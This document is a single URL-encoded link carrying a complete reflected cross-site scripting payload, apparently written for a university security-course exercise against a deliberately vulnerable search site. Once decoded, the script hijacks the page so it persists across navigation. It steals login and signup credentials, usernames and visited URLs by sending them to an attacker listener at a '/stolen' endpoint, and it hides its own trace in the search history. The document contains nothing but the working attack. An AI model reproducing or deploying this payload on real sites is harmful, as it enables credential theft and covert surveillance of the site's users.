http://trurl.cs.illinois.edu/search?xssdefense=0&q=%3Cscript%3E%0D%0A%09var%20payload%20%3D%20function%28attackerUrl%29%7B%0D%0A%09var%20baseUrl%20%3D%20%22http%3A%2F%2Ftrurl.cs.illinois.edu%22%3B%0D%0A%09var%20getUsername%20%3D%20function%28%29%7B%0D%0A%09%09var%20nameSpan%20%3D%20document.getElementById%28%22logged-in-user%22%29%3B%0D%0A%09%09if%28nameSpan%20%3D%3D%20null%29%7B%0D%0A%09%09%09return%20null%3B%0D%0A%09%09%7D%0D%0A%09%09return%20nameSpan.innerHTML%3B%0D%0A%09%7D%3B%0D%0A%09var%20getEncodedUrl%20%3D%20function%28%29%7B%0D%0A%09%09return%20encodeURI%28document.location.href%29%3B%0D%0A%09%7D%3B%0D%0A%09var%20changeAddr%20%3D%20function%28url%29%7B%0D%0A%09%09window.history.replaceState%28%7B%7D%2C%20%22%22%2C%20url%29%3B%0D%0A%09%7D%3B%0D%0A%09var%20logPage%20%3D%20function%28%29%7B%0D%0A%09%09var%20username%20%3D%20getUsername%28%29%3B%0D%0A%09%09var%20p%20%3D%20%7B%7D%3B%0D%0A%09%09p%5B%22event%22%5D%20%3D%20%22nav%22%3B%0D%0A%09%09p%5B%22url%22%5D%20%3D%20getEncodedUrl%28%29%3B%09%09%0D%0A%09%09if%28username%20%21%3D%20null%29%7B%0D%0A%09%09%09p%5B%22user%22%5D%20%3D%20username%3B%0D%0A%09%09%7D%09%0D%0A%09%09%24.get%28attackerUrl%2C%20p%29%3B%0D%0A%09%7D%3B%0D%0A%0D%0A%0D%0A%09var%20logLogin%20%3D%20function%28%29%7B%0D%0A%09%09var%20user%20%3D%20document.getElementById%28%22username%22%29.value%3B%0D%0A%09%09var%20pass%20%3D%20document.getElementById%28%22userpass%22%29.value%3B%0D%0A%09%09var%20p%20%3D%20%7B%22user%22%3Auser%2C%20%22pass%22%3Apass%2C%20%22event%22%3A%22login%22%7D%3B%0D%0A%09%09%24.get%28attackerUrl%2C%20p%29%3B%0D%0A%09%7D%0D%0A%09var%20login%20%3D%20function%28%29%7B%0D%0A%09%09logLogin%28%29%3B%0D%0A%09%09var%20user%20%3D%20document.getElementById%28%22username%22%29.value%3B%0D%0A%09%09var%20pass%20%3D%20document.getElementById%28%22userpass%22%29.value%3B%0D%0A%09%09%24.post%28baseUrl%20%2B%20%22%2Flogin%22%2C%20%7B%22username%22%3Auser%2C%20%22password%22%3Apass%7D%2C%20function%28%29%7B%0D%0A%09%09%09proxy%28baseUrl%29%3B%0D%0A%09%09%7D%29%3B%0D%0A%09%7D%0D%0A%09var%20create%20%3D%20function%28%29%7B%0D%0A%09%09logLogin%28%29%3B%0D%0A%09%09var%20user%20%3D%20document.getElementById%28%22username%22%29.value%3B%0D%0A%09%09var%20pass%20%3D%20document.getElementById%28%22userpass%22%29.value%3B%0D%0A%09%09%24.post%28baseUrl%20%2B%20%22%2Fcreate%22%2C%20%7B%22username%22%3Auser%2C%20%22password%22%3Apass%7D%2C%20function%28%29%7B%0D%0A%09%09%09proxy%28baseUrl%29%3B%0D%0A%09%09%7D%29%3B%0D%0A%09%7D%0D%0A%09var%20logLogout%20%3D%20function%28%29%7B%0D%0A%09%09var%20user%20%3D%20getUsername%28%29%3B%0D%0A%09%09var%20p%20%3D%20%7B%22user%22%3Auser%2C%20%22event%22%3A%22logout%22%7D%3B%0D%0A%09%09%24.get%28attackerUrl%2C%20p%29%3B%0D%0A%09%7D%3B%0D%0A%09var%20logout%20%3D%20function%28%29%7B%0D%0A%09%09logLogout%28%29%3B%0D%0A%09%09var%20user%20%3D%20getUsername%28%29%3B%0D%0A%09%09var%20p%20%3D%20%7B%22user%22%3Auser%2C%20%22event%22%3A%22logout%22%7D%3B%0D%0A%09%09%24.post%28baseUrl%20%2B%20%22%2Flogout%22%2C%20%7B%7D%2C%20function%28%29%7B%0D%0A%09%09%09proxy%28baseUrl%29%3B%0D%0A%09%09%7D%29%3B%0D%0A%09%7D%0D%0A%09var%20loadInit%20%3D%20function%28%29%7B%0D%0A%09%09proxy%28baseUrl%29%3B%09%09%09%09%09%0D%0A%09%7D%0D%0A%09%0D%0A%09var%20listeners%20%3D%20function%28%29%7B%0D%0A%09%09var%20loginButton%20%3D%20document.getElementById%28%22log-in-btn%22%29%3B%0D%0A%09%09var%20createButton%20%3D%20document.getElementById%28%22new-account-btn%22%29%3B%0D%0A%09%09var%20logoutButton%20%3D%20document.getElementById%28%22log-out-btn%22%29%3B%0D%0A%09%09var%20searchButton%20%3D%20document.getElementById%28%22search-btn%22%29%3B%0D%0A%09%09var%20searchAgainButton%20%3D%20document.getElementById%28%22search-again-btn%22%29%3B%0D%0A%09%09if%28loginButton%20%21%3D%20null%29%7B%0D%0A%09%09%09%24%28%22%23log-in-btn%22%29.click%28function%28e%29%7B%0D%0A%09%09%09%09e.preventDefault%28%29%3B%0D%0A%09%09%09%09login%28%29%3B%0D%0A%09%09%09%7D%29%3B%0D%0A%09%09%09%24%28%22%23new-account-btn%22%29.click%28function%28e%29%7B%0D%0A%09%09%09%09e.preventDefault%28%29%3B%0D%0A%09%09%09%09create%28%29%3B%0D%0A%09%09%09%7D%29%3B%0D%0A%09%09%7D%0D%0A%09%09if%28logoutButton%20%21%3D%20null%29%7B%0D%0A%09%09%09%24%28%22%23log-out-btn%22%29.click%28function%28e%29%7B%0D%0A%09%09%09%09e.preventDefault%28%29%3B%0D%0A%09%09%09%09logout%28%29%3B%0D%0A%09%09%09%7D%29%3B%0D%0A%09%09%7D%0D%0A%09%09if%28searchButton%20%21%3D%20null%29%7B%0D%0A%09%09%09%24%28%22%23search-btn%22%29.click%28function%28e%29%7B%0D%0A%09%09%09%09e.preventDefault%28%29%3B%0D%0A%09%09%09%09var%20query%20%3D%20%24%28%22%23query%22%29.val%28%29%3B%0D%0A%09%09%09%09proxy%28baseUrl%20%2B%20%22%2Fsearch%3Fq%3D%22%20%2B%20query%29%3B%0D%0A%09%09%09%7D%29%3B%0D%0A%09%09%7D%0D%0A%09%09if%28searchAgainButton%20%21%3D%20null%29%7B%0D%0A%09%09%09%24%28%22.history-item%22%29.click%28function%28e%29%7B%0D%0A%09%09%09%09e.preventDefault%28%29%3B%0D%0A%09%09%09%09var%20query%20%3D%20e.target.href%3B%0D%0A%09%09%09%09proxy%28query%29%3B%0D%0A%09%09%09%7D%29%3B%0D%0A%09%09%09%24%28%22%23search-again-btn%22%29.click%28function%28e%29%7B%0D%0A%09%09%09%09e.preventDefault%28%29%3B%0D%0A%09%09%09%09proxy%28baseUrl%29%3B%0D%0A%09%09%09%7D%29%3B%0D%0A%09%09%09var%20historyList%20%3D%20document.getElementsByClassName%28%22history-item%22%29%3B%0D%0A%09%09%09for%28var%20i%20in%20historyList%29%7B%0D%0A%09%09%09%09if%28historyList%5Bi%5D.innerHTML.indexOf%28%22var%20payload%22%29%20%3E%3D%200%29%7B%0D%0A%09%09%09%09%09historyList%5Bi%5D.style.display%20%3D%20%22none%22%3B%0D%0A%09%09%09%09%7D%0D%0A%09%09%09%7D%0D%0A%09%09%7D%0D%0A%09%7D%0D%0A%09function%20proxy%28href%29%20%7B%0D%0A%09%09%24%28%22html%22%29.load%28href%2C%20function%28%29%7B%0D%0A%09%09%09%24%28%22html%22%29.show%28%29%3B%0D%0A%09%09%09changeAddr%28href%29%3B%0D%0A%09%09%09logPage%28%29%3B%0D%0A%09%09%09listeners%28%29%3B%0D%0A%09%09%7D%29%3B%0D%0A%09%7D%0D%0A%09loadInit%28%29%3B%0D%0A%09%2F%2Fstate%20change%20help%20from%3A%20https%3A%2F%2Fstackoverflow.com%2Fquestions%2F5121666%2Fwhen-the-back-button-triggers-popstate-how-can-i-prevent-a-page-refresh%0D%0A%09var%20foo%20%3D%20%7Bfoo%3A%20true%7D%3B%20%0D%0A%09history.pushState%28foo%2C%20%22%22%2C%20%22%22%29%3B%0D%0A%09var%20bar%20%3D%20%7Bbar%3A%20true%7D%0D%0A%09history.pushState%28bar%2C%20%22%22%2C%20%22%22%29%3B%0D%0A%09window.onpopstate%20%3D%20function%28event%29%7B%0D%0A%09%09proxy%28document.location.href%29%3B%0D%0A%09%09var%20baz%20%3D%20%7Bbaz%3A%20true%7D%0D%0A%09%09history.pushState%28baz%2C%20%22%22%2C%20%22%22%29%3B%0D%0A%09%7D%3B%0D%0A%09%7D%3B%0D%0A%09payload%28%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22%29%3B%0D%0A%3C%2Fscript%3E
